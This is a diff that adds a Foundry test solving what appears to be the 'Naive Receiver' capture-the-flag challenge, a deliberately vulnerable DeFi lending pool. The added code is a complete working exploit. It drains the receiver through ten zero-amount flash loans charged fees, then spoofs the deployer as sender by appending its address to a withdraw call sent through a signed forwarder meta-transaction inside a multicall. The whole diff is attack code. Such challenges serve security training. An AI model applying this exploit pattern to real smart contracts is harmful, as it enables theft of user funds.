@@ -77,7 +77,34 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        bytes[] memory call = new bytes[](11);
+        for (uint8 i = 0; i < 10; i++) {
+            call[i] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(pool.weth()), 0, "0x");
+        }
+
+        call[10] = abi.encodePacked(
+            abi.encodeWithSelector(pool.withdraw.selector, WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery)),
+            bytes32(uint256(uint160(deployer)))
+        );
+
+        bytes memory multicall = abi.encodeWithSelector(pool.multicall.selector, call);
+        BasicForwarder.Request memory req = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: gasleft(),
+            nonce: forwarder.nonces(player),
+            data: multicall,
+            deadline: 10
+        });
+
+        bytes32 reqHash =
+            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(req)));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, reqHash);
+        bytes memory sig = abi.encodePacked(r, s, v);
+
+        forwarder.execute(req, sig);
     }
 
     /**
@@ -97,3 +124,4 @@ contract NaiveReceiverChallenge is Test {
         assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
     }
 }
+
